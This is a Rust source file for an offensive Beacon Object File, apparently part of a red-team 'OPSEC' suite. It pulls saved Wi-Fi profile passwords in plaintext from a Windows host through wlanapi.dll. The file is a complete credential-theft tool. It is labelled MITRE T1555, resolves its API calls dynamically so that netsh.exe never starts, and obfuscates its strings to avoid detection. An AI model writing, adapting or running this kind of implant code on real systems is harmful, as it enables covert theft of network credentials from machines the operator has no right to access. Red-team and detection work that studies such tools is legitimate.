// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! WLAN profile credential dump via wlanapi.dll DFR.
//! No netsh.exe spawn. Direct WlanOpenHandle → WlanEnumInterfaces →
//! WlanGetProfileList → WlanGetProfile (WLAN_PROFILE_GET_PLAINTEXT_KEY).
//! Scans the returned XML for <name> and <keyMaterial> tags.
//! Requires admin/SYSTEM for plaintext key material; non-admin enumerates
//! profiles but reports "(encrypted)" for the password field.
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555", name: "Credentials from Password Stores", tactic: "Credential Access" },
];

// WLAN_PROFILE_GET_PLAINTEXT_KEY — documented flag for WlanGetProfile
const WLAN_PROFILE_GET_PLAINTEXT_KEY: u32 = 0x00000004;
// WLAN_INTF_OPCODE_INTERFACE_STATE — unused here but kept for future use
const WLAN_CLIENT_VERSION_VISTA: u32 = 2;
const ERROR_SUCCESS: u32 = 0;

// WLAN_INTERFACE_INFO_LIST layout (x64):
//   +0  dwNumberOfItems   DWORD
//   +4  dwIndex           DWORD
//   +8  InterfaceInfo[0]  WLAN_INTERFACE_INFO (first entry)
//
// WLAN_INTERFACE_INFO layout:
//   +0   InterfaceGuid    GUID  (16 bytes)
//   +16  strInterfaceDescription WCHAR[256] = 512 bytes
//   +528 isState          DWORD  (ignored)
//   Total: 532 bytes (padded to 536 for alignment)
const WLAN_INTERFACE_INFO_SIZE: usize = 536;
const WLAN_INTERFACE_INFO_LIST_HEADER: usize = 8;

// WLAN_PROFILE_INFO_LIST layout:
//   +0  dwNumberOfItems DWORD
//   +4  dwIndex         DWORD
//   +8  ProfileInfo[0]  WLAN_PROFILE_INFO (first entry)
//
// WLAN_PROFILE_INFO layout:
//   +0  strProfileName  WCHAR[256] = 512 bytes
//   +512 dwFlags        DWORD
//   +516 dwProfileShareUserSetting DWORD
//   Total: ~520 bytes
const WLAN_PROFILE_INFO_SIZE: usize = 520;
const WLAN_PROFILE_INFO_LIST_HEADER: usize = 8;

dfr_fn!(
    wlan_open_handle(
        client_ver: u32,
        reserved: *mut u8,
        cur_ver: *mut u32,
        client_handle: *mut usize,
    ) -> u32,
    module = "wlanapi.dll",
    api    = "WlanOpenHandle"
);

dfr_fn!(
    wlan_close_handle(client_handle: usize, reserved: *mut u8) -> u32,
    module = "wlanapi.dll",
    api    = "WlanCloseHandle"
);

dfr_fn!(
    wlan_enum_interfaces(
        client_handle: usize,
        reserved: *mut u8,
        pp_intf_list: *mut *mut u8,
    ) -> u32,
    module = "wlanapi.dll",
    api    = "WlanEnumInterfaces"
);

dfr_fn!(
    wlan_free_memory(p_memory: *mut u8) -> (),
    module = "wlanapi.dll",
    api    = "WlanFreeMemory"
);

dfr_fn!(
    wlan_get_profile_list(
        client_handle: usize,
        intf_guid: *const u8,
        reserved: *mut u8,
        pp_profile_list: *mut *mut u8,
    ) -> u32,
    module = "wlanapi.dll",
    api    = "WlanGetProfileList"
);

dfr_fn!(
    wlan_get_profile(
        client_handle: usize,
        intf_guid: *const u8,
        profile_name: *const u16,
        reserved: *mut u8,
        pp_xml: *mut *mut u16,
        pdw_flags: *mut u32,
        pdw_granted_access: *mut u32,
    ) -> u32,
    module = "wlanapi.dll",
    api    = "WlanGetProfile"
);

/// Extract the text content between an XML tag pair in a wide string.
/// `tag` is the ASCII tag name (e.g. b"keyMaterial").
/// Scans the wide string linearly; returns the inner text as a WStr.
fn extract_xml_wide(xml: *const u16, xml_len: usize, tag: &[u8]) -> Option<WStr> {
    // Build open/close tag strings on-stack as wide chars
    let mut open  = [0u16; 64];
    let mut close = [0u16; 64];
    let olen = tag.len() + 2; // <tag>
    let clen = tag.len() + 3; // </tag>
    if olen >= 63 || clen >= 63 { return None; }
    open[0] = b'<' as u16;
    for (i, &b) in tag.iter().enumerate() { open[i + 1] = b as u16; }
    open[tag.len() + 1] = b'>' as u16;
    open[olen] = 0;

    close[0] = b'<' as u16;
    close[1] = b'/' as u16;
    for (i, &b) in tag.iter().enumerate() { close[i + 2] = b as u16; }
    close[tag.len() + 2] = b'>' as u16;
    close[clen] = 0;

    // Scan for open tag in the wide string
    let mut start: Option<usize> = None;
    'outer: for i in 0..xml_len.saturating_sub(olen) {
        let mut matches = true;
        for j in 0..olen {
            if unsafe { core::ptr::read_volatile(xml.add(i + j)) } != open[j] {
                matches = false;
                break;
            }
        }
        if matches { start = Some(i + olen); break 'outer; }
    }
    let start = start?;

    // Scan for close tag
    let mut end: Option<usize> = None;
    'outer2: for i in start..xml_len.saturating_sub(clen) {
        let mut matches = true;
        for j in 0..clen {
            if unsafe { core::ptr::read_volatile(xml.add(i + j)) } != close[j] {
                matches = false;
                break;
            }
        }
        if matches { end = Some(i); break 'outer2; }
    }
    let end = end?;

    let mut s = WStr::new();
    for i in start..end.min(start + 128) {
        let wc = unsafe { core::ptr::read_volatile(xml.add(i)) };
        if wc == 0 { break; }
        s.push(if wc < 128 { wc as u8 } else { b'?' });
    }
    Some(s)
}

/// Count the length of a wide (null-terminated) string.
fn wide_strlen(p: *const u16) -> usize {
    if p.is_null() { return 0; }
    let mut n = 0usize;
    loop {
        let wc = unsafe { core::ptr::read_volatile(p.add(n)) };
        if wc == 0 || n > 65535 { break; }
        n += 1;
    }
    n
}

/// Copy wide profile name into a narrow WStr for display.
fn wide_profile_name(ptr: *const u16) -> WStr {
    let mut s = WStr::new();
    let n = wide_strlen(ptr).min(128);
    for i in 0..n {
        let wc = unsafe { core::ptr::read_volatile(ptr.add(i)) };
        if wc == 0 { break; }
        s.push(if wc < 128 { wc as u8 } else { b'?' });
    }
    s
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let mut handle: usize = 0;
    let mut cur_ver: u32 = 0;

    let rc = unsafe {
        wlan_open_handle(WLAN_CLIENT_VERSION_VISTA, core::ptr::null_mut(), &mut cur_ver, &mut handle)
    }.map_err(|_| "wlan resolve failed")?;
    if rc != ERROR_SUCCESS {
        return Err("wlan open failed (WLAN service running?)");
    }

    let mut intf_list: *mut u8 = core::ptr::null_mut();
    let rc2 = unsafe {
        wlan_enum_interfaces(handle, core::ptr::null_mut(), &mut intf_list)
    }.map_err(|_| "intf enum resolve")?;
    if rc2 != ERROR_SUCCESS || intf_list.is_null() {
        unsafe { let _ = wlan_close_handle(handle, core::ptr::null_mut()); };
        return Err("interface enum failed");
    }

    let num_intf = unsafe { core::ptr::read_unaligned(intf_list as *const u32) } as usize;
    println!("[*] WLAN interfaces: {}", num_intf);

    for i in 0..num_intf {
        let intf_ptr = unsafe {
            intf_list.add(WLAN_INTERFACE_INFO_LIST_HEADER + i * WLAN_INTERFACE_INFO_SIZE)
        };
        // GUID is at offset 0 of WLAN_INTERFACE_INFO
        let guid_ptr = intf_ptr;
        // Interface description: WCHAR[256] at offset +16
        let desc_ptr = unsafe { intf_ptr.add(16) as *const u16 };
        let desc = wide_profile_name(desc_ptr);
        println!("[*] Interface {}: {}", i, desc);

        let mut prof_list: *mut u8 = core::ptr::null_mut();
        let rc3 = unsafe {
            wlan_get_profile_list(handle, guid_ptr, core::ptr::null_mut(), &mut prof_list)
        }.map_err(|_| "profile list resolve")?;
        if rc3 != ERROR_SUCCESS || prof_list.is_null() {
            continue;
        }

        let num_prof = unsafe { core::ptr::read_unaligned(prof_list as *const u32) } as usize;
        for j in 0..num_prof {
            let prof_entry = unsafe {
                prof_list.add(WLAN_PROFILE_INFO_LIST_HEADER + j * WLAN_PROFILE_INFO_SIZE)
            };
            // strProfileName: WCHAR[256] at offset 0
            let prof_name_ptr = prof_entry as *const u16;
            let prof_name = wide_profile_name(prof_name_ptr);

            // Retrieve full XML with plaintext key flag
            let mut xml_ptr: *mut u16 = core::ptr::null_mut();
            let mut flags: u32 = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            let mut granted: u32 = 0;
            let rc4 = unsafe {
                wlan_get_profile(
                    handle,
                    guid_ptr,
                    prof_name_ptr,
                    core::ptr::null_mut(),
                    &mut xml_ptr,
                    &mut flags,
                    &mut granted,
                )
            }.map_err(|_| "profile fetch resolve")?;

            if rc4 != ERROR_SUCCESS || xml_ptr.is_null() {
                println!("  [-] {} — profile fetch failed", prof_name);
                continue;
            }

            let xml_len = wide_strlen(xml_ptr);
            obf! { let key_tag  = "keyMaterial"; }
            obf! { let name_tag = "name";        }

            let key  = extract_xml_wide(xml_ptr, xml_len, key_tag.as_bytes());
            let _ssid = extract_xml_wide(xml_ptr, xml_len, name_tag.as_bytes());

            unsafe { let _ = wlan_free_memory(xml_ptr as *mut u8); };

            match key {
                Some(ref pw) if pw.len > 0 => {
                    println!("  [+] {} => {}", prof_name, pw);
                }
                _ => {
                    obf! { let enc_msg = "(encrypted — requires SYSTEM)"; }
                    println!("  [~] {} => {}", prof_name, enc_msg);
                }
            }
        }
        unsafe { let _ = wlan_free_memory(prof_list); };
    }

    unsafe {
        let _ = wlan_free_memory(intf_list);
        let _ = wlan_close_handle(handle, core::ptr::null_mut());
    };
    Ok(())
}

struct WStr { buf: [u8; 128], pub len: usize }
impl WStr {
    fn new() -> Self { Self { buf: [0u8; 128], len: 0 } }
    fn push(&mut self, b: u8) {
        if self.len < self.buf.len() { self.buf[self.len] = b; self.len += 1; }
    }
}
impl core::fmt::Display for WStr {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(core::str::from_utf8(&self.buf[..self.len]).unwrap_or("?"))
    }
}
